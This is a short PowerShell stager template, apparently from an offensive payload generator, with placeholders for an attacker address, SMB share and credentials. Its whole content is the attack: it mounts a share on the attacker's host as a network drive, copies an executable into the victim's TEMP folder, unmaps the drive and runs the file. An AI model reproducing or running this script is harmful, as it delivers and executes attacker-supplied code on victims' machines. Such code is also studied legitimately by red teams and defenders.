$victimDisk = "{{POWERSHELL_GENERATOR_VICTIM_DISK}}"
$powershellGeneratorExeFilename = "{{POWERSHELL_GENERATOR_EXE_FILENAME}}"
$attackerAddress = "{{ATTACKER_ADDRESS}}"
$smbShare = "{{SMB_SHARE}}"
$smbUser = "{{SMB_USER}}"
$smbPassword = "{{SMB_PASSWORD}}"


$user = $smbUser
$pass = ConvertTo-SecureString $smbPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
if (Get-PSDrive -Name $victimDisk -ErrorAction SilentlyContinue) {
    Remove-PSDrive -Name $victimDisk
}
New-PSDrive -Name $victimDisk -PSProvider FileSystem -Root "\\$attackerAddress\$smbShare" -Credential $cred -Persist *> $null
Copy-Item -Path "${victimDisk}:\$powershellGeneratorExeFilename" -Destination $env:TEMP
Remove-PSDrive -Name $victimDisk
& "$env:TEMP\$powershellGeneratorExeFilename"
Exit